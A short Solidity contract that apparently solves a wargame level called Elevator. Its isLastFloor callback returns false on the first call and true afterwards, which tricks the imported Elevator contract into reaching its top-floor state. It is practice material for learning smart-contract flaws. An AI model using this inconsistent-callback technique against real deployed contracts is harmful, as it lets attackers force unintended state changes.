// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract MyBuilding {
    Elevator elevator;
    bool hasCalled;

    constructor(address elevator_) {
        elevator = Elevator(elevator_);
    }

    function callElevator(uint256 floor) external {
        elevator.goTo(floor);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (hasCalled) {
            return true;
        }
        hasCalled = true;
        return false;
    }
}
